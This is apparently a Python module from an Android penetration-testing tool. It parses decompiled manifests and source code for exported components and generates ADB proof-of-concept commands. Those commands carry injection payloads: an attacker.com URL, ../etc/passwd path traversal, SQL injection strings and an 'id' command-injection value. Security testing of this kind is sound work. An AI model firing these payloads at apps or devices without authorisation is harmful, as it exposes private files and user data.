"""
Reachability Analysis for generating specific PoCs.

Analyzes:
- AndroidManifest.xml for intent filters, exported components
- Java/Kotlin code for intent extras, URI parameters
- Generates targeted ADB commands with actual parameters
"""

import os
import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set
from pathlib import Path


@dataclass
class IntentFilter:
    """Represents an intent filter from AndroidManifest."""
    actions: List[str] = field(default_factory=list)
    categories: List[str] = field(default_factory=list)
    data_schemes: List[str] = field(default_factory=list)
    data_hosts: List[str] = field(default_factory=list)
    data_paths: List[str] = field(default_factory=list)
    data_mime_types: List[str] = field(default_factory=list)


@dataclass
class ComponentInfo:
    """Information about an Android component."""
    name: str
    component_type: str  # activity, service, receiver, provider
    exported: bool = False
    permission: Optional[str] = None
    intent_filters: List[IntentFilter] = field(default_factory=list)
    # For providers
    authorities: List[str] = field(default_factory=list)
    read_permission: Optional[str] = None
    write_permission: Optional[str] = None
    # Extracted from code analysis
    expected_extras: Dict[str, str] = field(default_factory=dict)  # name -> type
    expected_data_params: List[str] = field(default_factory=list)
    uri_patterns: List[str] = field(default_factory=list)


@dataclass
class ReachabilityResult:
    """Result of reachability analysis with generated PoCs."""
    component: ComponentInfo
    entry_points: List[str] = field(default_factory=list)  # How to reach this
    adb_commands: List[str] = field(default_factory=list)  # Specific PoCs
    deep_links: List[str] = field(default_factory=list)
    attack_scenarios: List[str] = field(default_factory=list)


class ReachabilityAnalyzer:
    """Analyzes app for reachability and generates specific PoCs."""

    def __init__(self, decompiled_dir: str):
        self.decompiled_dir = decompiled_dir
        self.package_name = ""
        self.components: Dict[str, ComponentInfo] = {}
        self.manifest_path = self._find_manifest()

    def _find_manifest(self) -> Optional[str]:
        """Find AndroidManifest.xml in decompiled directory."""
        candidates = [
            os.path.join(self.decompiled_dir, "resources", "AndroidManifest.xml"),
            os.path.join(self.decompiled_dir, "AndroidManifest.xml"),
        ]
        for path in candidates:
            if os.path.exists(path):
                return path
        return None

    def analyze(self) -> Dict[str, ReachabilityResult]:
        """Run full reachability analysis."""
        results = {}

        # Parse manifest first
        if self.manifest_path:
            self._parse_manifest()

        # Analyze code for each component
        for name, component in self.components.items():
            self._analyze_component_code(component)
            result = self._generate_pocs(component)
            results[name] = result

        return results

    def _parse_manifest(self):
        """Parse AndroidManifest.xml for components and intent filters."""
        if not self.manifest_path:
            return

        with open(self.manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        # Extract package name
        pkg_match = re.search(r'package\s*=\s*["\']([^"\']+)["\']', content)
        if pkg_match:
            self.package_name = pkg_match.group(1)

        # Parse activities
        self._parse_components(content, 'activity')
        self._parse_components(content, 'service')
        self._parse_components(content, 'receiver')
        self._parse_providers(content)

    def _parse_components(self, content: str, comp_type: str):
        """Parse activity/service/receiver components from manifest."""
        # Match component blocks
        pattern = rf'<{comp_type}\s+([^>]*(?:>.*?</{comp_type}>|/>))'
        matches = re.finditer(pattern, content, re.DOTALL | re.IGNORECASE)

        for match in matches:
            block = match.group(0)

            # Extract name
            name_match = re.search(r'android:name\s*=\s*["\']([^"\']+)["\']', block)
            if not name_match:
                continue

            name = name_match.group(1)
            if name.startswith('.'):
                name = self.package_name + name

            # Check if exported
            exported = False
            exported_match = re.search(r'android:exported\s*=\s*["\'](\w+)["\']', block)
            if exported_match:
                exported = exported_match.group(1).lower() == 'true'

            # Check for intent-filter (implies exported=true for older APIs)
            has_intent_filter = '<intent-filter' in block
            if has_intent_filter and not exported_match:
                exported = True

            # Extract permission
            permission = None
            perm_match = re.search(r'android:permission\s*=\s*["\']([^"\']+)["\']', block)
            if perm_match:
                permission = perm_match.group(1)

            component = ComponentInfo(
                name=name,
                component_type=comp_type,
                exported=exported,
                permission=permission,
            )

            # Parse intent filters
            if has_intent_filter:
                component.intent_filters = self._parse_intent_filters(block)

            self.components[name] = component

    def _parse_intent_filters(self, block: str) -> List[IntentFilter]:
        """Parse intent-filter elements from a component block."""
        filters = []
        filter_pattern = r'<intent-filter[^>]*>(.*?)</intent-filter>'

        for match in re.finditer(filter_pattern, block, re.DOTALL):
            filter_content = match.group(1)
            intent_filter = IntentFilter()

            # Actions
            for action_match in re.finditer(r'<action\s+android:name\s*=\s*["\']([^"\']+)["\']', filter_content):
                intent_filter.actions.append(action_match.group(1))

            # Categories
            for cat_match in re.finditer(r'<category\s+android:name\s*=\s*["\']([^"\']+)["\']', filter_content):
                intent_filter.categories.append(cat_match.group(1))

            # Data elements
            for data_match in re.finditer(r'<data\s+([^>]+)/>', filter_content):
                data_attrs = data_match.group(1)

                scheme_match = re.search(r'android:scheme\s*=\s*["\']([^"\']+)["\']', data_attrs)
                if scheme_match:
                    intent_filter.data_schemes.append(scheme_match.group(1))

                host_match = re.search(r'android:host\s*=\s*["\']([^"\']+)["\']', data_attrs)
                if host_match:
                    intent_filter.data_hosts.append(host_match.group(1))

                path_match = re.search(r'android:path(?:Prefix|Pattern)?\s*=\s*["\']([^"\']+)["\']', data_attrs)
                if path_match:
                    intent_filter.data_paths.append(path_match.group(1))

                mime_match = re.search(r'android:mimeType\s*=\s*["\']([^"\']+)["\']', data_attrs)
                if mime_match:
                    intent_filter.data_mime_types.append(mime_match.group(1))

            filters.append(intent_filter)

        return filters

    def _parse_providers(self, content: str):
        """Parse content provider components."""
        pattern = r'<provider\s+([^>]*(?:>.*?</provider>|/>))'

        for match in re.finditer(pattern, content, re.DOTALL | re.IGNORECASE):
            block = match.group(0)

            name_match = re.search(r'android:name\s*=\s*["\']([^"\']+)["\']', block)
            if not name_match:
                continue

            name = name_match.group(1)
            if name.startswith('.'):
                name = self.package_name + name

            # Authorities
            authorities = []
            auth_match = re.search(r'android:authorities\s*=\s*["\']([^"\']+)["\']', block)
            if auth_match:
                authorities = [a.strip() for a in auth_match.group(1).split(';')]

            # Exported
            exported = False
            exported_match = re.search(r'android:exported\s*=\s*["\'](\w+)["\']', block)
            if exported_match:
                exported = exported_match.group(1).lower() == 'true'

            # Permissions
            read_perm = None
            write_perm = None
            perm_match = re.search(r'android:permission\s*=\s*["\']([^"\']+)["\']', block)
            read_match = re.search(r'android:readPermission\s*=\s*["\']([^"\']+)["\']', block)
            write_match = re.search(r'android:writePermission\s*=\s*["\']([^"\']+)["\']', block)

            if read_match:
                read_perm = read_match.group(1)
            if write_match:
                write_perm = write_match.group(1)
            if perm_match and not read_perm:
                read_perm = perm_match.group(1)

            component = ComponentInfo(
                name=name,
                component_type='provider',
                exported=exported,
                authorities=authorities,
                read_permission=read_perm,
                write_permission=write_perm,
            )

            self.components[name] = component

    def _analyze_component_code(self, component: ComponentInfo):
        """Analyze Java/Kotlin code to find expected parameters."""
        # Find the source file for this component
        class_name = component.name.split('.')[-1]
        source_file = self._find_source_file(component.name)

        if not source_file:
            return

        with open(source_file, 'r', encoding='utf-8', errors='ignore') as f:
            code = f.read()

        # Find intent extras being read
        self._extract_intent_extras(code, component)

        # Find URI parameters
        self._extract_uri_params(code, component)

        # Find WebView URL loading
        self._extract_webview_urls(code, component)

        # Find content provider paths
        if component.component_type == 'provider':
            self._extract_provider_paths(code, component)

    def _find_source_file(self, class_name: str) -> Optional[str]:
        """Find source file for a class."""
        # Convert class name to path
        relative_path = class_name.replace('.', os.sep)

        candidates = [
            os.path.join(self.decompiled_dir, "sources", f"{relative_path}.java"),
            os.path.join(self.decompiled_dir, "sources", f"{relative_path}.kt"),
        ]

        for path in candidates:
            if os.path.exists(path):
                return path

        # Try searching for the file
        class_simple = class_name.split('.')[-1]
        sources_dir = os.path.join(self.decompiled_dir, "sources")

        if os.path.exists(sources_dir):
            for root, _, files in os.walk(sources_dir):
                for fname in files:
                    if fname == f"{class_simple}.java" or fname == f"{class_simple}.kt":
                        return os.path.join(root, fname)

        return None

    def _extract_intent_extras(self, code: str, component: ComponentInfo):
        """Extract intent extras being read by the component."""
        # Patterns for reading intent extras
        patterns = [
            # getStringExtra("key")
            (r'get(\w+)Extra\s*\(\s*["\']([^"\']+)["\']', 'extra'),
            # getIntent().getExtras().getString("key")
            (r'getString\s*\(\s*["\']([^"\']+)["\']', 'string'),
            # intent.getStringExtra("key")
            (r'intent\.get(\w+)Extra\s*\(\s*["\']([^"\']+)["\']', 'extra'),
            # bundle.getString("key")
            (r'bundle\.get(\w+)\s*\(\s*["\']([^"\']+)["\']', 'bundle'),
        ]

        for pattern, ptype in patterns:
            for match in re.finditer(pattern, code, re.IGNORECASE):
                if ptype == 'extra':
                    extra_type = match.group(1)  # String, Int, Boolean, etc.
                    extra_name = match.group(2)
                    component.expected_extras[extra_name] = extra_type
                elif ptype == 'string':
                    component.expected_extras[match.group(1)] = 'String'
                elif ptype == 'bundle':
                    extra_type = match.group(1)
                    extra_name = match.group(2)
                    component.expected_extras[extra_name] = extra_type

    def _extract_uri_params(self, code: str, component: ComponentInfo):
        """Extract URI/data parameters being read."""
        # getData().getQueryParameter("param")
        pattern = r'getQueryParameter\s*\(\s*["\']([^"\']+)["\']'
        for match in re.finditer(pattern, code):
            component.expected_data_params.append(match.group(1))

        # getData().getPathSegments()
        if 'getPathSegments' in code or 'getLastPathSegment' in code:
            component.expected_data_params.append('_path_segment_')

    def _extract_webview_urls(self, code: str, component: ComponentInfo):
        """Extract WebView URL loading patterns."""
        # loadUrl(url) where url comes from intent
        patterns = [
            r'loadUrl\s*\(\s*(?:intent\.)?get\w*\s*\(\s*["\']([^"\']+)["\']',
            r'loadUrl\s*\(\s*(\w+)\s*\)',  # loadUrl(urlVar)
            r'loadData(?:WithBaseURL)?\s*\(',
        ]

        for pattern in patterns:
            if re.search(pattern, code):
                # Mark that this component loads URLs
                component.expected_extras.setdefault('url', 'String')
                component.expected_extras.setdefault('link', 'String')
                component.expected_extras.setdefault('uri', 'String')

    def _extract_provider_paths(self, code: str, component: ComponentInfo):
        """Extract content provider URI paths."""
        # UriMatcher patterns
        pattern = r'addURI\s*\(\s*["\']?[^"\']*["\']?\s*,\s*["\']([^"\']+)["\']'
        for match in re.finditer(pattern, code):
            path = match.group(1)
            component.uri_patterns.append(path)

        # Common table names in queries
        table_pattern = r'(?:TABLE_NAME|tableName)\s*=\s*["\']([^"\']+)["\']'
        for match in re.finditer(table_pattern, code):
            component.uri_patterns.append(match.group(1))

    def _generate_pocs(self, component: ComponentInfo) -> ReachabilityResult:
        """Generate specific PoCs for a component."""
        result = ReachabilityResult(component=component)

        if not component.exported:
            return result

        if component.component_type == 'activity':
            self._generate_activity_pocs(component, result)
        elif component.component_type == 'service':
            self._generate_service_pocs(component, result)
        elif component.component_type == 'receiver':
            self._generate_receiver_pocs(component, result)
        elif component.component_type == 'provider':
            self._generate_provider_pocs(component, result)

        return result

    def _generate_activity_pocs(self, component: ComponentInfo, result: ReachabilityResult):
        """Generate PoCs for an activity."""
        short_name = component.name.replace(self.package_name, '')
        if not short_name.startswith('.'):
            short_name = '.' + short_name.split('.')[-1]

        full_component = f"{self.package_name}/{short_name}"

        # Basic launch command
        base_cmd = f"adb shell am start -n {full_component}"

        # Add intent extras if found
        extras_cmd = ""
        for extra_name, extra_type in component.expected_extras.items():
            if extra_type.lower() in ['string', 'charsequence']:
                if extra_name.lower() in ['url', 'link', 'uri', 'href', 'redirect', 'next', 'target']:
                    # URL parameter - use malicious URL
                    extras_cmd += f' --es "{extra_name}" "https://attacker.com/malicious"'
                    result.attack_scenarios.append(f"URL injection via '{extra_name}' parameter")
                elif extra_name.lower() in ['path', 'file', 'filename']:
                    # Path parameter - use path traversal
                    extras_cmd += f' --es "{extra_name}" "../../../../../../etc/passwd"'
                    result.attack_scenarios.append(f"Path traversal via '{extra_name}' parameter")
                elif extra_name.lower() in ['cmd', 'command', 'exec']:
                    extras_cmd += f' --es "{extra_name}" "id"'
                    result.attack_scenarios.append(f"Command injection via '{extra_name}' parameter")
                elif extra_name.lower() in ['query', 'sql', 'search']:
                    extras_cmd += f' --es "{extra_name}" "\' OR 1=1--"'
                    result.attack_scenarios.append(f"SQL injection via '{extra_name}' parameter")
                else:
                    extras_cmd += f' --es "{extra_name}" "test_value"'
            elif extra_type.lower() in ['int', 'integer', 'long']:
                extras_cmd += f' --ei "{extra_name}" 1337'
            elif extra_type.lower() == 'boolean':
                extras_cmd += f' --ez "{extra_name}" true'

        if extras_cmd:
            result.adb_commands.append(base_cmd + extras_cmd)
        else:
            result.adb_commands.append(base_cmd)

        # Generate deep links from intent filters
        for intent_filter in component.intent_filters:
            for action in intent_filter.actions:
                if action != 'android.intent.action.MAIN':
                    result.entry_points.append(f"Action: {action}")

            # Build deep links
            for scheme in intent_filter.data_schemes:
                for host in intent_filter.data_hosts or ['']:
                    for path in intent_filter.data_paths or ['']:
                        if scheme in ['http', 'https']:
                            deep_link = f"{scheme}://{host}{path}"
                            # Add query params
                            if component.expected_data_params:
                                params = '&'.join([f"{p}=INJECT" for p in component.expected_data_params if p != '_path_segment_'])
                                if params:
                                    deep_link += f"?{params}"
                        else:
                            deep_link = f"{scheme}://{host}{path}"

                        result.deep_links.append(deep_link)

                        # Generate ADB command to open deep link
                        link_cmd = f'adb shell am start -a android.intent.action.VIEW -d "{deep_link}"'
                        if link_cmd not in result.adb_commands:
                            result.adb_commands.append(link_cmd)

    def _generate_service_pocs(self, component: ComponentInfo, result: ReachabilityResult):
        """Generate PoCs for a service."""
        short_name = component.name.replace(self.package_name, '')
        if not short_name.startswith('.'):
            short_name = '.' + short_name.split('.')[-1]

        full_component = f"{self.package_name}/{short_name}"
        base_cmd = f"adb shell am startservice -n {full_component}"

        # Add extras
        extras_cmd = ""
        for extra_name, extra_type in component.expected_extras.items():
            if extra_type.lower() in ['string', 'charsequence']:
                extras_cmd += f' --es "{extra_name}" "malicious_value"'

        if extras_cmd:
            result.adb_commands.append(base_cmd + extras_cmd)
        else:
            result.adb_commands.append(base_cmd)

        # Add action-based commands
        for intent_filter in component.intent_filters:
            for action in intent_filter.actions:
                action_cmd = f'adb shell am startservice -a "{action}"'
                result.adb_commands.append(action_cmd)
                result.entry_points.append(f"Action: {action}")

    def _generate_receiver_pocs(self, component: ComponentInfo, result: ReachabilityResult):
        """Generate PoCs for a broadcast receiver."""
        short_name = component.name.replace(self.package_name, '')
        if not short_name.startswith('.'):
            short_name = '.' + short_name.split('.')[-1]

        full_component = f"{self.package_name}/{short_name}"

        # Get actions from intent filters
        for intent_filter in component.intent_filters:
            for action in intent_filter.actions:
                cmd = f'adb shell am broadcast -a "{action}" -n {full_component}'

                # Add extras
                for extra_name, extra_type in component.expected_extras.items():
                    if extra_type.lower() in ['string', 'charsequence']:
                        cmd += f' --es "{extra_name}" "malicious"'

                result.adb_commands.append(cmd)
                result.entry_points.append(f"Broadcast: {action}")

        # If no actions found, try basic broadcast
        if not result.adb_commands:
            result.adb_commands.append(f"adb shell am broadcast -n {full_component}")

    def _generate_provider_pocs(self, component: ComponentInfo, result: ReachabilityResult):
        """Generate PoCs for a content provider."""
        for authority in component.authorities:
            # Skip file providers
            if 'fileprovider' in authority.lower():
                continue

            # Basic query
            base_uri = f"content://{authority}"
            result.adb_commands.append(f'adb shell content query --uri {base_uri}/')

            # Query specific paths found in code
            for path in component.uri_patterns:
                # Replace wildcards
                path = path.replace('#', '1').replace('*', 'test')
                result.adb_commands.append(f'adb shell content query --uri {base_uri}/{path}')

            # Try common paths
            common_paths = ['users', 'accounts', 'data', 'items', 'messages', 'files']
            for path in common_paths:
                cmd = f'adb shell content query --uri {base_uri}/{path}'
                if cmd not in result.adb_commands:
                    result.adb_commands.append(cmd)

            # SQL injection test
            result.adb_commands.append(
                f'adb shell content query --uri {base_uri}/ --where "\' OR \'1\'=\'1"'
            )
            result.attack_scenarios.append("SQL injection via content provider query")

            # Path traversal test
            result.adb_commands.append(
                f'adb shell content read --uri {base_uri}/../../../etc/passwd'
            )
            result.attack_scenarios.append("Path traversal via content provider")

            result.entry_points.append(f"Authority: {authority}")


def analyze_reachability(decompiled_dir: str) -> Dict[str, ReachabilityResult]:
    """Convenience function to run reachability analysis."""
    analyzer = ReachabilityAnalyzer(decompiled_dir)
    return analyzer.analyze()
